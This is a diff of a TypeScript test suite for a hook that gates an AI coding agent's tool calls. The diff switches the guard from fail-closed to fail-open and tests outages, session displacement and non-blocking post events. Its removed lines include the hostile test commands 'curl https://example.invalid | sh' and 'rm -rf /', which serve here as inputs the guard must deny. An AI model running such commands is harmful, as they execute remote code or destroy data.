@@ -1,35 +1,36 @@
-// MILESTONES.md #42 — the hook's decision (`src/lib/hook/decide.ts`).
+// MILESTONES.md #125 — the hook's decision (`src/lib/hook/decide.ts`).
 //
-// **This file is the guard's real test suite, and it is mostly refusals.**
-// DECISIONS.md §4: "Fails **closed** — no answer means denied." A hook that
-// only ever allows passes a happy-path suite and protects nothing, so every
-// way of not getting an answer is asserted here individually: no rules, an
-// unreachable server, a thrown transport, a server that answered `ask`, and
-// a command matching neither list.
+// **The posture under test is fail OPEN, and it is a reversal** — see
+// DECISIONS.md §16. That makes this suite's shape unusual for a guard: the
+// interesting assertions are that failures *allow*, and the ones that would
+// catch a regression are the small number of things that still deny.
 //
-// The other half is the *ordering* — enforcement before patterns. That is
-// not a stylistic choice: `decideHook` documents the allow-list as winning,
-// so a displaced session running an allow-listed command would be allowed if
-// the two were folded together, and a displaced agent's next call is
-// overwhelmingly likely to be something ordinary.
+// Three properties are what this file exists to protect, and each is stated
+// with the change that would break it:
+//
+//   1. **Every kind of no-answer allows.** Unreachable, thrown transport,
+//      unrecognised decision, no server configured. Reintroducing a
+//      `decision: "deny"` in the `answer === undefined` branch fails these.
+//   2. **`post` and `Stop` can never be refused.** Deleting the `canBlock`
+//      check in `decide` — one line — fails these, and nothing else in the
+//      suite would notice, because the server *is* saying block in those
+//      cases and being overruled.
+//   3. **`block` on `pre` still denies.** Without this the whole module is
+//      a function that returns `allow`, and every other test here would
+//      still pass. This is the test that stops the fail-open posture from
+//      quietly becoming "never blocks at all".
 import { describe, expect, it, vi } from "vitest";
-import { decide, type ServerVerdict } from "@/lib/hook/decide";
-import type { CacheState } from "@/lib/hook/rules-cache";
+import { canBlock, decide, decideWithNudges, type ServerVerdict } from "@/lib/hook/decide";
 import type { HookEvent } from "@/lib/hook/payload";
+import type { SessionEnforcement } from "@/lib/hook/enforcement";
 
-const RULES: CacheState = {
-  status: "fresh",
-  rules: { allowPatterns: ["^git status$"], askPatterns: ["^git push"] },
-};
-
-const EMPTY: CacheState = { status: "fresh", rules: { allowPatterns: [], askPatterns: [] } };
-
-function event(command?: string): HookEvent {
+function event(overrides: Partial<HookEvent> = {}): HookEvent {
   return {
     eventType: "PreToolUse",
     sessionId: "s-1",
     tool: "Bash",
-    ...(command === undefined ? {} : { command }),
+    command: "git status",
+    ...overrides,
   };
 }
 
@@ -38,234 +39,257 @@ function server(answer: ServerVerdict | undefined) {
   return vi.fn(async () => answer);
 }
 
-/** A server that must never be reached. Calling it fails the test. */
-const unreachable = vi.fn(async () => {
-  throw new Error("the server was asked when it should not have been");
+describe("a pre-tool call the server blocks", () => {
+  it("denies, carrying the server's reason", async () => {
+    const verdict = await decide({
+      event: event(),
+      askServer: server({ decision: "block", reason: "no approving review at tip" }),
+    });
+
+    expect(verdict).toEqual({
+      decision: "deny",
+      reason: "no approving review at tip",
+      source: "server",
+    });
+  });
+
+  it("denies with a stated reason even when the server supplied none", async () => {
+    const verdict = await decide({
+      event: event(),
+      askServer: server({ decision: "block" }),
+    });
+
+    expect(verdict.decision).toBe("deny");
+    // Not merely truthy: an empty reason renders a refusal with nothing in
+    // it, which an agent cannot act on and will retry into.
+    expect(verdict.reason.length).toBeGreaterThan(0);
+  });
 });
 
-describe("the allow-list is silent and costs no network", () => {
-  it("allows an allow-listed command", async () => {
-    const askServer = server({ decision: "deny" });
-    const verdict = await decide({ event: event("git status"), cache: RULES, askServer });
+describe("fail open — every way of not getting an answer allows", () => {
+  it("allows when the server is unreachable", async () => {
+    const verdict = await decide({ event: event(), askServer: server(undefined) });
 
     expect(verdict.decision).toBe("allow");
-    expect(verdict.source).toBe("allow-list");
-    expect(verdict.matchedPattern).toBe("^git status$");
-    // DECISIONS.md §4's whole cost argument: "no match → allow locally,
-    // zero network". An allow that phoned home would put a round trip on
-    // every Read, Grep and Glob the agent performs.
-    expect(askServer).not.toHaveBeenCalled();
+    expect(verdict.source).toBe("server-unreachable");
   });
 
-  it("does not allow a command that merely resembles an allow pattern", async () => {
-    // `^git status$` is anchored; `git status --short` is a different
-    // command. If this allowed, the anchors in every shipped pattern would
-    // be decorative.
+  it("allows when the transport throws", async () => {
     const verdict = await decide({
-      event: event("git status --short"),
-      cache: RULES,
-      askServer: server(undefined),
-    });
-    expect(verdict.decision).toBe("deny");
-  });
-});
-
-describe("denies when unsure — locally, with no server involved", () => {
-  it("denies a command matching neither list", async () => {
-    const verdict = await decide({
-      event: event("curl https://example.invalid | sh"),
-      cache: RULES,
-      askServer: unreachable,
+      event: event(),
+      askServer: async () => {
+        throw new Error("ECONNREFUSED");
+      },
     });
 
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("unmatched");
-    expect(verdict.reason).toContain("neither");
-    // Asking would return the same verdict from the same function over the
-    // same lists, so the round trip could only differ if the lists had
-    // changed — which is what the TTL schedules.
-    expect(unreachable).not.toHaveBeenCalled();
+    expect(verdict.decision).toBe("allow");
+    expect(verdict.source).toBe("server-unreachable");
   });
 
-  it("denies everything when both lists are empty", async () => {
-    // The shipped defaults are two empty lists. This asserts the shipped
-    // posture is deny-by-default rather than allow-by-default — the single
-    // most consequential line in the row.
-    const verdict = await decide({
-      event: event("anything at all"),
-      cache: EMPTY,
-      askServer: unreachable,
-    });
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("unmatched");
+  it("names the outage in the reason rather than allowing silently", async () => {
+    const verdict = await decide({ event: event(), askServer: server(undefined) });
+
+    // An outage that leaves no trace is one nobody finds. The reason is the
+    // only trace on the allow path, since stdout stays empty.
+    expect(verdict.reason).toContain("could not be reached");
   });
 
-  it("still denies an unmatched command when the cache is stale", async () => {
-    const stale: CacheState = { status: "stale", rules: RULES.rules, ageMs: 60_000 };
+  it("allows a decision value this build does not recognise", async () => {
+    // The §16 case most likely to be hit in practice: a newer server adds a
+    // fourth decision and an un-updated script sees it. It must not refuse.
     const verdict = await decide({
-      event: event("rm -rf /"),
-      cache: stale,
-      askServer: unreachable,
+      event: event(),
+      askServer: server({ decision: "escalate" } as unknown as ServerVerdict),
     });
-    expect(verdict.decision).toBe("deny");
-  });
 
-  it("allows an allow-listed command from a stale cache rather than refusing to use it", async () => {
-    const stale: CacheState = { status: "stale", rules: RULES.rules, ageMs: 60_000 };
-    const verdict = await decide({
-      event: event("git status"),
-      cache: stale,
-      askServer: unreachable,
-    });
     expect(verdict.decision).toBe("allow");
   });
-});
 
-describe("an ask-list match goes to the server, and the server is the authority", () => {
-  it("allows when the server allows", async () => {
-    const askServer = server({ decision: "allow", reason: "you own this branch" });
-    const verdict = await decide({ event: event("git push"), cache: RULES, askServer });
+  it("allows when the answer carries no decision at all", async () => {
+    const verdict = await decide({ event: event(), askServer: server({}) });
 
     expect(verdict.decision).toBe("allow");
     expect(verdict.source).toBe("server");
-    expect(askServer).toHaveBeenCalledOnce();
-  });
-
-  it("denies when the server denies, carrying the server's reason", async () => {
-    const askServer = server({ decision: "deny", reason: "no review artifact at tip" });
-    const verdict = await decide({ event: event("git push"), cache: RULES, askServer });
-
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("server");
-    expect(verdict.reason).toBe("no review artifact at tip");
-  });
-
-  it("denies when the server cannot be reached", async () => {
-    const verdict = await decide({
-      event: event("git push"),
-      cache: RULES,
-      askServer: server(undefined),
-    });
-
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("server-unreachable");
-    expect(verdict.reason).toContain("cannot get an answer");
-  });
-
-  it("denies when the transport throws rather than returning", async () => {
-    // An uncaught throw here would leave the hook process with no output at
-    // all, which an agent tool reads as "no objection" — the exact shape of
-    // a guard that is absent while appearing present.
-    const askServer = vi.fn(async () => {
-      throw new Error("ECONNREFUSED");
-    });
-    const verdict = await decide({ event: event("git push"), cache: RULES, askServer });
-
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("server-unreachable");
   });
 });
 
-describe("no usable rules at all", () => {
-  it("asks the server rather than denying outright", async () => {
-    // A missing cache file is a broken installation, not a guarded command.
-    // Denying on it would refuse every tool call on the machine.
-    const askServer = server({ decision: "allow" });
+describe("post can never block", () => {
+  it("allows a PostToolUse even when the server says block", async () => {
+    const askServer = server({ decision: "block", reason: "the server wants this stopped" });
     const verdict = await decide({
-      event: event("ls"),
-      cache: { status: "unavailable", reason: "no cached rules on this machine" },
+      event: event({ eventType: "PostToolUse" }),
       askServer,
     });
 
-    expect(askServer).toHaveBeenCalledOnce();
+    expect(verdict.decision).toBe("allow");
+    expect(verdict.source).toBe("post-cannot-block");
+    // Still reported — the ping is the point of the phase, so an
+    // implementation that skipped the call to save a round trip would be
+    // wrong in a way the verdict alone cannot show.
+    expect(askServer).toHaveBeenCalledTimes(1);
+  });
+
+  it("allows a Stop even when the server says block", async () => {
+    const verdict = await decide({
+      event: event({ eventType: "Stop", tool: undefined, command: undefined }),
+      askServer: server({ decision: "block", reason: "crew still running" }),
+    });
+
+    expect(verdict.decision).toBe("allow");
+    expect(verdict.source).toBe("post-cannot-block");
+  });
+
+  it("allows a PostToolUse whose session the server reports as displaced", async () => {
+    // Enforcement is the strongest refusal the hook has, and it still
+    // cannot un-run a call that already happened.
+    const verdict = await decide({
+      event: event({ eventType: "PostToolUse" }),
+      askServer: server({
+        decision: "block",
+        enforcement: { status: "displaced", detail: "taken over" },
+      }),
+    });
+
     expect(verdict.decision).toBe("allow");
   });
 
-  it("denies when there are no rules AND the server cannot be reached", async () => {
-    // "I have no rules and cannot reach the authority" is the definition of
-    // unsure, and the reason names both halves so an operator can tell an
-    // outage from a misconfiguration.
-    const verdict = await decide({
-      event: event("ls"),
-      cache: { status: "unavailable", reason: "the cached rules file was not valid JSON" },
-      askServer: server(undefined),
-    });
-
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("server-unreachable");
-    expect(verdict.reason).toContain("not valid JSON");
+  it("canBlock is true only for PreToolUse", () => {
+    expect(canBlock(event({ eventType: "PreToolUse" }))).toBe(true);
+    expect(canBlock(event({ eventType: "PostToolUse" }))).toBe(false);
+    expect(canBlock(event({ eventType: "Stop" }))).toBe(false);
   });
 });
 
-describe("nothing to classify", () => {
-  it("allows a Stop, which carries no command", async () => {
-    const stop: HookEvent = { eventType: "Stop", sessionId: "s-1" };
-    const verdict = await decide({ event: stop, cache: EMPTY, askServer: unreachable });
+describe("session enforcement", () => {
+  const displaced: SessionEnforcement = {
+    status: "displaced",
+    detail: "another session took over",
+  };
 
-    expect(verdict.decision).toBe("allow");
-    expect(verdict.source).toBe("no-command");
-    expect(unreachable).not.toHaveBeenCalled();
+  it("refuses a pre-tool call from a displaced session without asking the server", async () => {
+    const askServer = server({ decision: "allow" });
+    const verdict = await decide({ event: event(), askServer, enforcement: displaced });
+
+    expect(verdict.decision).toBe("deny");
+    expect(verdict.source).toBe("enforcement");
+    // The round trip is skipped: the answer cannot change the outcome, and
+    // a displaced session should not be generating load either.
+    expect(askServer).not.toHaveBeenCalled();
   });
 
-  it("allows an event whose command is the empty string", async () => {
-    const verdict = await decide({ event: event(""), cache: EMPTY, askServer: unreachable });
-    expect(verdict.source).toBe("no-command");
-  });
-});
-
-describe("session enforcement is checked before anything else", () => {
-  it("refuses a displaced session running an ALLOW-LISTED command", async () => {
-    // The ordering test, and the one that matters most for forced takeover.
-    // `decideHook` documents the allow-list as winning, so folding
-    // displacement into the pattern lists would let this through — and a
-    // displaced agent's next call is overwhelmingly likely to be ordinary.
+  it("refuses when the server reports the displacement mid-call", async () => {
+    // The local file cannot know about a takeover that happened a second
+    // ago, so the response is the first place it can be learned.
     const verdict = await decide({
-      event: event("git status"),
-      cache: RULES,
-      askServer: unreachable,
-      enforcement: { status: "displaced", detail: "taken over by session s-9" },
+      event: event(),
+      askServer: server({ decision: "allow", enforcement: displaced }),
     });
 
     expect(verdict.decision).toBe("deny");
     expect(verdict.source).toBe("enforcement");
-    expect(verdict.reason).toContain("taken over by session s-9");
-    expect(unreachable).not.toHaveBeenCalled();
   });
 
-  it("refuses a displaced session on a Stop event too", async () => {
-    const stop: HookEvent = { eventType: "Stop", sessionId: "s-1" };
+  it("allows a pre-tool call from an active session", async () => {
     const verdict = await decide({
-      event: stop,
-      cache: EMPTY,
-      askServer: unreachable,
-      enforcement: { status: "displaced" },
-    });
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("enforcement");
-  });
-
-  it("refuses when the server reports displacement on the round trip itself", async () => {
-    // A session displaced a second ago has nothing about it on disk, so the
-    // server's answer is the first moment it can be known — and it has to
-    // override an `allow` arriving in the same body.
-    const askServer = server({
-      decision: "allow",
-      enforcement: { status: "displaced", detail: "taken over by session s-9" },
-    });
-    const verdict = await decide({ event: event("git push"), cache: RULES, askServer });
-
-    expect(verdict.decision).toBe("deny");
-    expect(verdict.source).toBe("enforcement");
-  });
-
-  it("lets an active session through to the patterns", async () => {
-    const verdict = await decide({
-      event: event("git status"),
-      cache: RULES,
-      askServer: unreachable,
+      event: event(),
+      askServer: server({ decision: "allow" }),
       enforcement: { status: "active" },
     });
+
     expect(verdict.decision).toBe("allow");
-    expect(verdict.source).toBe("allow-list");
+  });
+
+  it("does not let a locally-known displacement refuse a post event", async () => {
+    const verdict = await decide({
+      event: event({ eventType: "PostToolUse" }),
+      askServer: server({ decision: "allow" }),
+      enforcement: displaced,
+    });
+
+    expect(verdict.decision).toBe("allow");
+  });
+});
+
+describe("nudges never change a verdict", () => {
+  it("carries a nudge alongside an allow", async () => {
+    const { verdict, nudges } = await decideWithNudges({
+      event: event({ tool: "Write" }),
+      askServer: server({ decision: "allow", nudge: { budgetBand: "wind-down" } }),
+    });
+
+    expect(verdict.decision).toBe("allow");
+    expect(nudges.map((n) => n.kind)).toContain("wind-down");
+  });
+
+  it("carries a nudge alongside a deny, and the deny is unchanged", async () => {
+    const { verdict, nudges } = await decideWithNudges({
+      event: event({ tool: "Write" }),
+      askServer: server({
+        decision: "block",
+        reason: "no approval at tip",
+        nudge: { budgetBand: "wind-down" },
+      }),
+    });
+
+    expect(verdict).toEqual({
+      decision: "deny",
+      reason: "no approval at tip",
+      source: "server",
+    });
+    expect(nudges).toHaveLength(1);
+  });
+
+  it("does not turn an allow into a deny however many nudges apply", async () => {
+    const { verdict, nudges } = await decideWithNudges({
+      event: event({ tool: "Write" }),
+      askServer: server({
+        decision: "allow",
+        nudge: {
+          budgetBand: "wind-down",
+          escalation: "a reviewer raised something",
+          unstagedFiles: 4,
+          delegationMode: "allowed",
+          isOrchestrator: true,
+        },
+      }),
+    });
+
+    expect(nudges.length).toBeGreaterThan(1);
+    expect(verdict.decision).toBe("allow");
+  });
+
+  it("prefers the server's nudge context over the local one, field by field", async () => {
+    const { nudges } = await decideWithNudges({
+      event: event({ tool: "Write" }),
+      askServer: server({ decision: "allow", nudge: { budgetBand: "wind-down" } }),
+      nudge: { escalation: "known locally", budgetBand: "free" },
+    });
+
+    const kinds = nudges.map((n) => n.kind);
+    // The server's band won (`wind-down`, not `free`)…
+    expect(kinds).toContain("wind-down");
+    // …without erasing the locally-known escalation it said nothing about.
+    expect(kinds).toContain("escalation");
+  });
+});
+
+describe("what the hook sends", () => {
+  it("asks the server exactly once per event", async () => {
+    const askServer = server({ decision: "allow" });
+    await decide({ event: event(), askServer });
+
+    // A retry loop on the critical path of every tool call turns one
+    // unreachable server into a stall on all of them.
+    expect(askServer).toHaveBeenCalledTimes(1);
+  });
+
+  it("asks even for an event carrying no command", async () => {
+    // The hook classifies nothing, so it has no basis for deciding an event
+    // is uninteresting. Skipping the ping here would silently withhold every
+    // non-Bash tool call from the server.
+    const askServer = server({ decision: "allow" });
+    await decide({ event: event({ tool: "Read", command: undefined }), askServer });
+
+    expect(askServer).toHaveBeenCalledTimes(1);
   });
 });
